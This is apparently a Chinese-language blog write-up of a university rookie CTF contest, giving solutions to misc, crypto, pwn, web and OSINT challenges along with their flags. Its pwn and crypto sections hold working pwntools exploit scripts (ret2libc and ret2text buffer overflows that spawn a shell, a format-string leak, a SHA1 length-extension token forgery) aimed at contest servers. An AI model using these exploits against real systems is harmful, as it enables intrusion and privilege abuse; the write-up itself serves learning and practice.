---
title: SWJTU-CTF-25 新秀杯 WP
date: 2025-12-15
image: logo.jpg
categories:
  - CTF
  - 竞赛
  - 网安
---

## Misc

### 哈基米得了mvp

附件是一个加密压缩包 `encrypted.zip` 和明文 `plaintext.txt`，立马想到已知明文攻击

1. 使用 bkcrack 简单检查一下，加密算法是 ZipCrypto，直接确定
2. 使用 7zip 制作明文压缩包，注意使用“仅存储”
3. 使用下面的命令破解密钥

```shell
bkcrack -C hakimi_mvp_challenge.zip -c plaintext.txt -P plain.zip -p plaintext.txt
```

4. 得到密钥后直接解密压缩包拿到 flag

```shell
bkcrack -C hakimi_mvp_challenge.zip -k a0b1c2d3 e4f5g6h7 i8j9k0l1 -d cracked.zip
```

### 嗷呜

今年的 misc 白给题，有经验 ~~（找过资源）~~ 的人应该能直接认出来，直接放到兽音解码工具中解码即可

### 我们的游戏確有問題

主办方在赛程中间突然放出的 misc 游戏题（今年貌似因为时间有限完成度不高），首杀还有特殊奖励

这题发布的时候我还在三食堂啃鸡腿呢，看大伙在群里面哀嚎，我只能用手机面对着 exe 发呆，想着首杀估计是没戏了

回寝室打开电脑一看，游戏图标怎么是个 python？顿时“恶相胆边生😈”：你说，出题人出题的时候会不会忘记做加密/混淆呢？
然后这题就从 misc 题变成了 reverse 题（

1. 首先从图标几乎可以肯定用的是 **PyInstaller** 打包的，但是以防出题人有诈(x)，我们用 `strings` 命令再确认一下

```console
❯ strings 橘雪莉的奇幻冒险.exe | grep "pyi"
_pyi_main_co
pyi-python-flag
pyi-runtime-tmpdir
pyi-contents-directory
pyi-hide-console
pyi-
_pyinstaller_pyz
mpyimod01_archive
mpyimod02_importers
mpyimod03_ctypes
mpyimod04_pywin32
spyiboot01_bootstrap
spyi_rth_inspect
opyi-contents-directory _internal
```

这下确定是 **PyInstaller** 打包了

2. 直接使用 [pyinstxtractor.py](https://github.com/extremecoders-re/pyinstxtractor) 进行解包，获取文件夹 `橘雪莉的奇幻冒险.exe_extracted`

3. 找到里面的最大的 pyc 文件 `game.pyc`，（这一步本来应该还需要使用 `struct.pyc` 进行补头，但是新版本的 **pyinstxtractor** 已经帮我们把这一步做完了）。直接使用 [pycdc](https://github.com/zrax/pycdc) 或是在线工具进行反编译

4. 游戏逻辑
从反编译结果可以看到，**正常**通关方法是搜集字母拼出单词 *kindred*，flag 就会出现
但是这个游戏还隐藏了几个后门：
> 1. 用户名使用 *kindred* 时，直接显示 flag 前半部分，并且解锁传送和全图查看功能，还可以穿墙和加速
> 2. 用户名使用 *admin*/*debug* 时，可以查看坐标/内存变量状态
> 3. 在游戏中使用 `上上下下左右左右BABA` 这个魂斗罗经典秘籍的时候，直接获得 flag 后半部分

5. 最后拼出完整答案 `flag{kindred_thank_you_for_playing_this_game}`

![手刹已拿](image/index/1765790492363.jpg) ![和出题人的对话](image/index/1765790498534.jpg)

最后拿到了奖品魔审，好耶🥰

### 星环日志：第7号残片

pdf 题，依旧文件隐写，题目提示是 `XOR+?+?`

1. 首先用纯文本格式打开查看，发现 Object 9 是一个嵌入式文件流（Stream），长度仅 60 字节，且没有标注 Filter（过滤器），这意味着它是裸字节（Raw Bytes）
2. 提取出字节流内容：`/:*q6 .*!s{&1 ;#$(rs{&4!$s.!/&. /w$` 确实有很多不可见字符，根据密文的前几个字节以及固定格式 "flag{...}"，这里可以猜出密钥应该是 42（宇宙的终极答案）
3. 接下来使用 42 进行异或，得 base64 结果`ZmxhZ3tFbGlhc19TdGVsbGFyaXNfMjE0N19FdXJvcGFfRW1lcmdlbmN5fQ==`，解码得`flag{Elias_Stellaris_2147_Europa_Emergency}`

<!-- Todo: 写完RGB-->
<!-- ### 最后的 R.G!B?

这题其实没做出来，还差最后一个 part 3，终归是道行不够😇，这里还是记录一下做题流程 -->

### 月半猫和奶龙真是一对苦命鸳鸯

一开始用 stegsolve 叠了半天，看胖猫奶龙的缝合怪把我 san 值都要干没了，最后发现放进随波逐流一把梭了（，两个图片RG0和00B拼起来就是 flag

![牢记最高指示🫡](image/index/1765792309859.jpg)

### 阿萨拉电台

音频隐写题，由题目的提示 "you could see the audio"，首先使用频谱分析，但是分析无果。后面怀疑使用 LSB 在每个采样点的最低位进行隐写，经测试正好发现了 PNG 文件头`89 50 4E 47 0D 0A 1A 0A`。编写下方脚本可以提取出一个二维码，扫描即可得出 flag

```python
import numpy as np
from scipy.io import wavfile

def solve():
    fs, data = wavfile.read('asara_radio_station.wav')

    lsb = data & 1
    lsb_bytes = np.packbits(lsb)

    png_signature = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
    lsb_data = lsb_bytes.tobytes()
    start_offset = lsb_data.find(png_signature)

    if start_offset != -1:
        print(f"在偏移量 {start_offset} 处发现 PNG ⽂件头！")
        png_data = lsb_data[start_offset:]
        with open('flag.png', 'wb') as f:
            f.write(png_data)
        print("成功提取⽂件: flag.png")
        print("请打开 flag.png 查看最终 Flag。")
    else:
        print("未在 LSB 数据中发现 PNG ⽂件头。")

if __name__ == '__main__':
    solve()
```

怨念：每次有二维码的题都要卡半天，去年曼彻斯特的也是（吐血

## Crypto

### Broadcast Mayday!

当同一个明文消息 $m$ 使用相同的**小公钥指数** $e$（这里 $e=3$）加密发送给 $k$ 个不同的接收者（模数为 $n_1, n_2, \dots, n_k$），且 $k \ge e$ 时，我们可以利用**中国剩余定理 (CRT)** 恢复出明文。

已知：
$$
\begin{cases}
c_1 \equiv m^e \pmod{n_1} \\
c_2 \equiv m^e \pmod{n_2} \\
c_3 \equiv m^e \pmod{n_3}
\end{cases}
$$

我们可以通过 CRT 计算出一个数 $C$，使得：
$$ C \equiv m^e \pmod{n_1 \cdot n_2 \cdot n_3} $$

解题脚本：

```python
import sympy
import gmpy2

# --- 题目给出的数据 ---
e = 3

n1 = 92115348414647145744942290482438108731351762209411954562581348940707868731036245627500433519371993679505350448706770557161219940579492266005829570662132118431769877704072034110899075752607538375198156669112004335086224921217459978021792019801412747035487994163136912896890937398834748390623372881042019936713
c1 = 37200871830656989509585109324571909904756015127793123197130883254106018377171885657835514800162401320146006985022958231927796179533942338054373296193632356913787597295032396539550096310631833715431578658537578254861531650216064367780472605097680343437199708398358791853856381695077

n2 = 107724705233055883081751721820024537967383348784274707683197256750962086833992211892130729806540411724416536258297016669042940442848435141693540234286837159113373010687953933673937825312480194072635181507552396292463829107673816320217815715976290351449432206814810274039955958399317467366451913130432389085003
c2 = 37200871830656989509585109324571909904756015127793123197130883254106018377171885657835514800162401320146006985022958231927796179533942338054373296193632356913787597295032396539550096310631833715431578658537578254861531650216064367780472605097680343437199708398358791853856381695077

n3 = 94872673633406396995297289835600763806262337074512934673113566808569442630985008762887860592268702511296878448137078036296381031226430144507819817141157483185804334623630822323025118948888645875600836830885573655432196307004742051095606839449546166172293018214114182272767946968456915879022656708269505066749
c3 = 37200871830656989509585109324571909904756015127793123197130883254106018377171885657835514800162401320146006985022958231927796179533942338054373296193632356913787597295032396539550096310631833715431578658537578254861531650216064367780472605097680343437199708398358791853856381695077

# --- 攻击过程 ---

print("开始执行哈斯塔德广播攻击...")

# 1. 使用中国剩余定理 (CRT) 求解 M = m^e
# sympy.ntheory.modular.crt 的参数是 (模数列表, 余数列表)
moduli = [n1, n2, n3]
remainders = [c1, c2, c3]

# crt 返回一个元组 (解, 模数的乘积)
M, N = sympy.ntheory.modular.crt(moduli, remainders)
print(f"1. 使用 CRT 求得 M = m^{e} = {M}")
print(f"   模数的乘积 N = n1*n2*n3 = {N}")
print("-" * 20)

# 2. 对 M 开 e 次方根，得到 m
# 使用 gmpy2.iroot 进行精确的整数开方，它返回 (根, 是否为完美幂)
m, is_perfect_root = gmpy2.iroot(M, e)

if is_perfect_root:
    print(f"2. 成功对 M 开 {e} 次方根，得到 m = {m}")
    print("-" * 20)

    # 3. 将整数 m 转换为字符串 (flag)
    # 计算将整数 m 转换为字节所需的长度
    byte_length = (m.bit_length() + 7) // 8
    flag_bytes = m.to_bytes(byte_length, "big")

    try:
        flag = flag_bytes.decode("utf-8")
        print(f"3. 将 m 转换为字符串，得到 Flag:")
        print(flag)
    except UnicodeDecodeError:
        print("3. 无法解码为 UTF-8，原始字节为:")
        print(flag_bytes)

else:
    print(f"2. M 不是一个完美的 {e} 次方，攻击失败。")
    print("   这可能意味着模数不互质，或者这不是一个标准的广播攻击。")

```

### Secure Token?

这题的目标已经说明：伪造一个具有管理员权限的 token，从而访问 /admin 页面

那么我们来复习一下 MD5、SHA1、SHA256 这些算法的核心逻辑：
1. 初始化： 算法有一个固定的初始状态（IV）。

2. 第一棒（处理 Block 1）： 拿着 IV 和第一块数据进行复杂的运算，得出一个中间状态（State）。

3. 第二棒（处理 Block 2）： 拿着“第一棒的中间状态”作为起点，和第二块数据运算，得出新的状态。

4. ...以此类推...

5. 终点： 处理完所有数据后，最后的中间状态就是我们看到的哈希值（Signature）。

这里的漏洞就在于：如果我们知道了中间状态，即使不知道前面的数据是什么，依然能接力继续计算出新的哈希值

本题使用了这个验证方式 $Token=SHA1(SECRET_KEY+username)$，即使不知道前面的数据（SECRET_KEY）是什么，也可以接过这一棒，继续往后添加数据，算出新的哈希值

哈希算法在处理数据前，一定会对数据进行填充，使其长度满足整块的要求（64字节倍数）。 原本服务器做的事情是： SHA1( `[Key]` `[guest]` `[Padding]` ) --> 得到 Token(旧)

这里的 `[Padding]` 是根据 len(Key) + len("guest") 自动生成的，通常包含 \x80、一堆 \x00 和 数据总长度。
我们要在这个基础上“续写”数据。既然我们要利用旧的 Token 继续算，那么新的数据结构必须严格遵守之前的物理顺序：伪造的数据流 = `[Key]` `[guest]` `[Padding]` `[admin]`

然后使用使用 `hashpump`，继续处理字符串 "admin"

以下是爆破 key 长度加伪造数据的脚本：

```python
from pwn import *
import hashpumpy
import re

# 配置连接信息
HOST = '47.108.129.134'
PORT = 33769 # 请确保端口与你当前的题目实例一致

# 开启 pwntools 的日志，方便看过程（如果觉得太吵可以改成 'error'）
context.log_level = 'info' 

def attack():
    # 原始数据和要附加的数据
    original_data = 'guest'
    append_data = 'admin'

    # 我们不知道密钥长度，需要爆破 (假设长度在 1-64 之间)
    # 虽然 Token 变了，但通常密钥的长度是固定的配置
    for key_length in range(1, 64):
        try:
            p = remote(HOST, PORT)
            
            # 1. 读取服务器的欢迎信息
            # 读取直到提示输入的地方，这样我们就拿到了上面所有的文本
            welcome_msg = p.recvuntil(b"Enter 'username:token' to login (raw bytes allowed): ")
            
            # 2. 使用正则提取当前的 Guest token
            # 寻找 "Guest token: " 后面的 40 位 hex 字符
            # output decode 为 string 方便正则匹配
            match = re.search(r'Guest token: ([a-f0-9]{40})', welcome_msg.decode(errors='ignore'))
            
            if not match:
                log.failure("Could not extract token from server response.")
                p.close()
                continue
                
            current_token = match.group(1)
            log.info(f"[*] Key Len Guess: {key_length} | Captured Token: {current_token}")

            # 3. 使用 HashPump 计算新的签名和 payload
            # 参数: (current_hash, original_data, data_to_add, key_length)
            new_hash, new_message = hashpumpy.hashpump(current_token, original_data, append_data, key_length)

            # 4. 发送 Payload
            # 格式: username:token
            # new_message 已经是包含 padding 的 bytes 了，无需 encode
            payload = new_message + b':' + new_hash.encode()
            
            p.sendline(payload)

            # 5. 获取结果
            response = p.recvall(timeout=2).decode(errors='ignore')
            
            p.close()

            # 6. 检查 Flag
            if 'flag{' in response or 'success' in response.lower():
                print("\n" + "="*50)
                print(f"[+] SUCCESS! Found Flag with key length: {key_length}")
                print("Response content:")
                print(response)
                print("="*50 + "\n")
                return # 拿到 flag 直接退出函数

            # 如果没有 flag，说明这个 key_length 不对（或者服务器真的在校验 key 内容是否正确）
            # 继续下一次循环

        except Exception as e:
            log.warning(f"Connection error or exception: {e}")
            try:
                p.close()
            except:
                pass

if __name__ == "__main__":
    attack()
```

### XOR Me If You Can

利用异或的**可逆性**，如果  `明文 ⊕ 密钥 = 密文`，那么 `密文 ⊕ 明文 = 密钥`。

比如密文 hex 为 54595450...，取前 8 位十六进制字符（即前 4 个字节）：54 59 54 50。我们又已知 flag 格式为 `flag{...}`，直接取前四位进行异或
- 0x54 ^ 0x66 ('f') = 0x32 (ASCII 字符 '2')
- 0x59 ^ 0x6c ('l') = 0x35 (ASCII 字符 '5')
- 0x54 ^ 0x61 ('a') = 0x35 (ASCII 字符 '5')
- 0x50 ^ 0x67 ('g') = 0x37 (ASCII 字符 '7')
能得出这里的密钥是 2557，然后再在 nc 连接中输入即可

### 神秘的购物清单

白给题，凯撒密码，扔随波逐流了，得：
`I might need a better graphics card，flag is crazy_thursday_vivo_fifty`

### 赛博厨师的黑暗料理

1. 首先源字符串以 `=`，结尾，很明显的 base64，解码后得一 16 进制字符串
`3d 30 4b 4d 30 79 54...`
2. 我们再使用将其转化为 ASCII，得：
`=0KM0yTqyEPpjS2KxIloiq2Ku9IM2STDbg3MukzM`
3. 有 `=` 在开头，通常需要倒置，导致后尝试再次 base64 解码，但是不可行，结合提示的“经典密码替换，我们尝试 ROT13，得出：
`ZmxhZ3toQGF2ZV9hX2dvyVkX2FwcCRlGl0ZX0=`
4. 最后再进行一次 base64 解码得最终flag

## Pwn

### EzLibc

1. 把附件程序丢到反编译器中，可以在 main 函数中找到一个关键部分
`printf("The location of 'printf': %p\n", &printf);`
这直接泄露了 `printf` 真实地址，所以不需要再构造 ROP 链去泄露真实地址了，只需要接收这个地址 -> 算出 Libc 基址 -> 直接打 system("/bin/sh")，但是直接计算 Offset = 128 + 8 = 136 尝试无果，说明在 pwn 的主程序中没有 pop rdi; ret 指令，因此实际应该对 libc.so.6 的地址进行操作

2. 在 Libc 里找 Gadget

```shell
ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi
```

3. 获取 `pop rdi ; ret` 前面的偏移量，然后填入下面脚本中

```python
from pwn import *

# ================= 配置 =================
# p = process('./pwn_patched')
p = remote('IP地址', 端口号) 
libc = ELF('./libc.so.6')

# 溢出偏移量 (根据之前的分析是 136)
offset = 136

# ================= 攻击 =================

# 1. 接收泄露
p.recvuntil(b"printf': ")
leak = int(p.recvline().strip(), 16)
print(f"[*] Leaked printf: {hex(leak)}")

# 2. 计算基址
libc.address = leak - libc.symbols['printf']
print(f"[*] Libc Base: {hex(libc.address)}")

# 3. 计算 Libc 内的 Gadget 和 函数
# ！！！这里是关键修改！！！
# 你需要把刚才 ROPgadget 跑出来的偏移填在这里
# 假设 ROPgadget 输出是 0x2a3e5 : pop rdi ; ret
pop_rdi_offset = 0x2a3e5  # <--- 把你在 libc 里找到的偏移填这
pop_rdi = libc.address + pop_rdi_offset 

system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
ret = pop_rdi + 1 # 依然是用作对齐

print(f"[*] pop_rdi real addr: {hex(pop_rdi)}")

# 4. 发送 Payload
# 全程使用 Libc 里的资源，完全不依赖主程序
payload = flat([
    b'A' * offset,
    ret,        # 栈对齐 (如果有问题就去掉)
    pop_rdi,
    bin_sh,
    system_addr
])

p.sendlineafter(b"name:", payload)
p.interactive()
```

4. 拿到 shell，`cat flag`

### FMT

反编译发现程序中存在 printf(s)，其中 s 是用户输入的内容，且未限制格式化字符。
程序生成了两个随机字符串：
- s2：存储在 栈 (Stack) 上。
- v4：存储在 堆 (Heap) 上，但其指针存储在栈上。

通过静态分析得
- s (输入缓冲区) 位于 rsp+0x50，对应 printf 的第 16 个参数。
- s2 (栈上数据) 位于 rsp+0x40，对应第 14 个参数。
- v4 (堆指针) 位于 rsp+0x28，对应第 11 个参数。

对于栈上的 s2，使用 `%14$p` 读取其十六进制数值。
对于堆指针 v4，使用 %11$s 进行解引用（Dereference）读取字符串

```python
# 修改 offset 定义部分
def exploit(offset_ignored): # 参数可以忽略
    p = remote(ip, port)
    
    # === 使用静态分析计算出的准确偏移 ===
    # v4 在 rsp+0x28, 是第 11 个参数
    # s2 在 rsp+0x40, 是第 14 个参数
    offset_v4 = 11
    offset_s2 = 14
    
    log.info(f"Target 1 (s2 - Stack) offset: {offset_s2}")
    log.info(f"Target 2 (v4 - Heap)  offset: {offset_v4}")
    
    # 构造 Payload
    # %14$p 读取栈上 s2 的数值 (hex)
    # %11$s 读取 v4 指针指向的堆字符串
    payload = f"%{offset_s2}$p||%{offset_v4}$s".encode()
    
    # 发送 payload
    p.recvuntil(b"name?\n")
    p.sendline(payload)
    
    p.recvuntil(b"Nice to meet you,")
    
    # --- 接收并处理数据 ---
    try:
        leak_line = p.recvline().strip()
        log.info(f"Leak output: {leak_line}")
        
        parts = leak_line.split(b'||')
        
        # 1. 解析 s2 (栈上的字符串)
        # 注意：s2 是 char s2[16]，在内存中是小端序存储的
        hex_s2 = parts[0]
        s2_int = int(hex_s2, 16)
        s2_str = p64(s2_int).replace(b'\x00', b'') # 转回字符串并去掉空字节
        log.success(f"Recovered s2: {s2_str}")
        
        # 2. 解析 v4 (堆上的字符串)
        # %s 会直接打印出字符串内容
        v4_str_raw = parts[1]
        # 截取前5个字符，因为有可能读到了后面的 "I buried..."
        if b"I buried" in v4_str_raw:
            v4_str = v4_str_raw.split(b"I buried")[0]
        else:
            v4_str = v4_str_raw
        
        # 确保只取前5位（题目生成长度为5）
        v4_str = v4_str[:5]
        log.success(f"Recovered v4: {v4_str}")
        
        # --- 发送答案 ---
        p.recvuntil(b"Can you find them?\n")
        p.sendline(s2_str)
        
        p.recvuntil(b"Yeah,another one?\n")
        p.sendline(v4_str)
        
        p.interactive()
        
    except Exception as e:
        log.error(f"Error parsing: {e}")
        p.interactive()

if __name__ == "__main__":
    exploit(0)
```

### File Descriptor

这题其实考的是类 unix 系统的基础知识，（还没看完的 OSTEP 突然开始攻击我）
核心规则：
文件描述符的两个核心规则：
1. 标准文件描述符：
0: stdin (标准输入)
1: stdout (标准输出)
2: stderr (标准错误)
2. 当打开一个新文件（open）或复制文件描述符（dup）时，操作系统会分配 当前最小的、未被使用的 非负整数作为新的文件描述符。

题目附件的关键逻辑：

```c
// 初始状态：FD 0, 1, 2 被占用

fd = dup(1);  
// dup(1) 复制标准输出。
// 因为 0, 1, 2 已被占，根据分配原则，fd 获得下一个最小数：3。
// 此时：FD 3 也是标准输出（屏幕）。

write(fd, "I've hidden the fd of stdout. Can you find it?\n", 0x2Fu);
// 向 FD 3 写入提示信息。

close(1);
// 关键点！关闭了标准输出 FD 1。
// 此时 FD 1 变成了“空闲”状态。
// 现在的占用情况：0 (stdin), 2 (stderr), 3 (stdout copy)。

__isoc99_scanf("%d", &fd1);
write(fd1, "You are right.What would you like to see?\n", 0x2Au);
// 程序要求输入 fd1。
// 如果我们输入 1，write(1, ...) 会失败，因为 1 刚刚被关了。
// 我们必须输入 3，因为 FD 3 是我们刚才 dup 出来的 stdout 的备份。

__isoc99_scanf("%s%*c", file);
// 输入文件名，我们当然想看 "flag"。

open(file, 0);
// 关键点！打开文件 "flag"。
// 根据分配原则，系统会寻找最小的未占用 FD。
// 因为刚才 close(1) 释放了 1，所以 flag 文件的 FD 将会被分配为 1。

write(fd1, "What is its fd?\n", 0x10u);
// 问你刚才打开的文件的 FD 是多少。

__isoc99_scanf("%d", &fd2);
read(fd2, &buf, 0x50u);
write(fd1, &buf, 0x50u);
// 从 fd2 读取内容并输出到 fd1 (屏幕)。
// 所以 fd2 应该是 1。
```

所以只需要依次回复 "3, flag, 1" 即可拿下

### Hello Dream! Hello Piggod!

出题人何等美丽的精神状态。。。

走迷宫，BFS 秒了，稍微注意一下终端里横竖的宽度和转义序列的问题，直接上代码：

```python
from pwn import *
import re
import collections

# 题目配置
ip = '47.108.129.134'
port = 33575

# 正则表达式：用于匹配并删除 ANSI 转义序列（颜色代码）
ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

def solve():
    # 1. 连接题目
    try:
        r = remote(ip, port)
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return

    print("[*] 正在接收迷宫...")
    try:
        # 接收所有数据直到输入提示
        data = r.recvuntil(b'Input (w/a/s/d):').decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"[-] 接收数据失败: {e}")
        r.close()
        return

    # 2. 数据清洗 (关键步骤)
    # 去除颜色代码，恢复原始字符串长度
    clean_data = ansi_escape.sub('', data)
    
    lines = clean_data.split('\n')
    maze_grid = []
    start_pos = None
    end_pos = None

    print("[*] 解析迷宫结构...")
    
    # 3. 解析迷宫并修正对齐
    for line in lines:
        # 只要包含墙壁字符，就认为是迷宫的一部分
        if '█' in line:
            
            if '🐷' in line:
                # 记录起点 (行号, 列号)
                start_col = line.find('🐷')
                start_pos = (len(maze_grid), start_col)
                # 替换为两个空格，保持对齐
                line = line.replace('🐷', '  ')
            
            if '⚪' in line:
                # 记录终点
                end_col = line.find('⚪')
                end_pos = (len(maze_grid), end_col)
                # 替换为两个空格
                line = line.replace('⚪', '  ')
                
            maze_grid.append(line)

    if not start_pos or not end_pos:
        print("[-] 解析失败：未找到起点或终点")
        print("调试信息 - 原始数据片段:")
        print(clean_data[:500])
        r.close()
        return

    print(f"[+] 迷宫尺寸: {len(maze_grid)}x{len(maze_grid[0])}")
    print(f"[+] 起点: {start_pos}, 终点: {end_pos}")

    # 4. BFS 广度优先搜索
    # 队列元素: (当前行, 当前列, 路径字符串)
    queue = collections.deque([(start_pos[0], start_pos[1], "")])
    visited = set()
    visited.add(start_pos)
    
    # 定义移动方向
    # 关键点：左右移动步长为 2 (因为墙壁是 '██'，宽为2)，上下移动步长为 1
    moves = [
        (-1, 0, 'w'), # 上
        (1, 0, 's'),  # 下
        (0, -2, 'a'), # 左
        (0, 2, 'd')   # 右
    ]
    
    final_path = ""
    rows = len(maze_grid)
    cols = len(maze_grid[0])
    
    found = False
    while queue:
        r_curr, c_curr, path = queue.popleft()
        
        if (r_curr, c_curr) == end_pos:
            final_path = path
            found = True
            break
        
        for dr, dc, char in moves:
            nr, nc = r_curr + dr, c_curr + dc
            
            # 边界检查 + 墙壁检查 + 访问检查
            if 0 <= nr < rows and 0 <= nc < cols:
                # 检查是否撞墙 (只要不是 '█' 就可以走)
                # 注意：我们已经把🐷和⚪替换成了空格，所以这里只需要判断不是墙即可
                if maze_grid[nr][nc] != '█' and (nr, nc) not in visited:
                    visited.add((nr, nc))
                    queue.append((nr, nc, path + char))

    # 5. 发送结果
    if found:
        print(f"[+] 路径找到! 步数: {len(final_path)}")
        r.sendline(final_path.encode())
        print("[*] 正在切换到交互模式...")
        r.interactive()
    else:
        print("[-] 未找到路径，算法可能存在逻辑漏洞或地图解析错误。")
        r.close()

if __name__ == '__main__':
    solve()
```

### NC TEST

netcat 使用教程题，过

### Ret2text

经典的 gets 溢出，给 clangd 都要警告的（

反编译发现 `vulnerable()` 函数中使用了 `gets(v1)`，无长度限制。
目标：跳转到后门函数 backdoor() (0x4011B6) 执行 system("/bin/sh")。

遇到的坑：直接覆盖返回地址为 backdoor 会导致程序在 system 函数内部崩溃。因为在 Ubuntu GLIBC 环境下，调用 system 时 movaps 指令要求栈指针 RSP 必须 16字节对齐。直接跳转导致栈未对齐。所以在跳转到 backdoor 之前，先跳转到一个 ret 指令 (Gadget)。

脚本：

```python
from pwn import *

ip = '47.108.129.134'
port = 33715
context.arch = 'amd64'
context.log_level = 'debug'

def exploit():
    p = remote(ip, port)
    
    # 加载 ELF 文件，pwntools 会自动分析
    elf = ELF('./pwn') # 确保 pwn 文件在同目录下
    
    # 1. 获取 backdoor 地址
    backdoor_addr = 0x4011B6
    
    # 2. 自动寻找 ret 地址 (神奇的一步)
    rop = ROP(elf)
    ret_addr = rop.find_gadget(['ret'])[0]
    log.info(f"Found ret gadget at: {hex(ret_addr)}")

    # 3. 构造 Payload
    offset = 20
    payload = b'A' * offset + p64(ret_addr) + p64(backdoor_addr)

    p.recvuntil(b"Tell me your name:")
    p.sendline(payload)
    
    p.interactive()

if __name__ == '__main__':
    exploit()
```

## Web

### CAFEBABE

1. 首先进入网站后按提示搜索咖啡，比如“美式”，链接变为`http://47.108.129.134:34930/cafe/Americano`

2. 那么我们尝试将咖啡名换位 "Flag" 访问，收到了警告：

![访问被拒绝](image/index/1765943878316.png)

3. 结合提示的“一步一步来”，说明可能需要使用搜索的方式进入，但是直接搜索 Flag 是没有结果的。我们想到可能需要伪造请求头的 `Referer`，检查确保用户是从搜索页面点击进来的，而不是直接在浏览器地址栏输入的。

懒得用 Burp Suite，直接用 Requests 库写脚本了：

```python
import requests

# 题目基础 URL
base_url = "http://47.108.129.134:34930/"
target_url = f"{base_url}/cafe/Flag"

# 构造伪造的 Referer
# 逻辑是：我们需要假装是在搜索框搜索了 "Flag"，然后点击进来的
fake_referer = f"{base_url}/search?q=Flag"

# 设置请求头
headers = {
    # 模拟浏览器，防止因 User-Agent 为空被拦截
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    # 核心：告诉服务器我们是从搜索页过来的
    "Referer": fake_referer
}

print(f"[*] 正在尝试访问: {target_url}")
print(f"[*] 伪造 Referer 为: {fake_referer}")
print("-" * 40)

try:
    # 发送 GET 请求
    response = requests.get(target_url, headers=headers)
    
    # 输出结果
    print(f"[+] 状态码: {response.status_code}")
    print("[+] 响应内容:\n")
    print(response.text)
    
    # 简单判断是否拿到 Flag
    if "flag{" in response.text or "cafebabe" in response.text:
        print("\n[!!!] 恭喜！发现疑似 Flag 的内容！")
    else:
        print("\n[-] 未直接发现 Flag，请检查响应内容。")

except Exception as e:
    print(f"[-] 发生错误: {e}")
```

获取 html 后发现有个压缩包要下载，修改一下脚本：

```python
import requests
import os

# 基础配置
base_url = "http://47.108.129.134:34930"
download_url = f"{base_url}/download/flag"
fake_referer = f"{base_url}/search?q=Flag"
save_filename = "flag.zip"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Referer": fake_referer,  # 继续携带这个“通行证”
}

print(f"[*] 正在尝试下载文件: {download_url}")

try:
    # 发送请求，注意 stream=True 用于下载文件
    response = requests.get(download_url, headers=headers, stream=True)

    if response.status_code == 200:
        # 保存文件
        with open(save_filename, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"\n[+] 下载成功！文件已保存为: {os.path.abspath(save_filename)}")
        print("[*] 请尝试解压该文件。")

        # 简单检查文件头（魔术数字）
        with open(save_filename, "rb") as f:
            magic = f.read(4).hex().upper()
            print(f"[*] 文件头魔术数字: {magic}")
            if magic == "504B0304":
                print("    -> 这是一个标准的 ZIP 文件")
            elif magic == "CAFEBABE":
                print("    -> 这是一个 Java Class 文件 (被重命名为 zip 了)")
    else:
        print(f"[-] 下载失败，状态码: {response.status_code}")
        print("[-] 响应内容:", response.text)

except Exception as e:
    print(f"[-] 发生错误: {e}")
```

拿到压缩包是一个 class 文件，直接扔 Idea 里面炼化（反编译）了，一段简单的字符拼接，直接运行得出 Flag

还有 "CAFEBABE" 居然算是干扰信息，就是为了引着AI往 java SSTI 方向想，出题人太坏了！😡

### hello

## Reverse

## AI

### CV 高手的 Overfitting 审判

### 别样的人机大战

## OSINT

看似是道**图寻**题，其实是道**Misc**题

直接用文本格式打开照片，发现其中藏有 `hint:6300a7850e01526a3691dec5403dfe`，查询 md5 发现数字是云南某地的酒店电话，直接地图定位获取位置提交

思考历程：
这题本来以为真要图寻的，而且一直看不懂 "hint is hint" 的意思，还以为是示例位置藏了东西，然后用谷歌地球定位到二教楼下的一个绿化带里，结果自然是一无所获啊😭😭。然后没由来地认为应该是成都本地，甚至就在学校附近，然后就从犀浦站开始找符合的方位，眼睛都看花了也没线索😇

但是群里有人认出来了图中有昆明当地的双子塔，更有图寻大手子古法开盒利用图中信息分析定位的，这个真👻🌶️

## 致谢
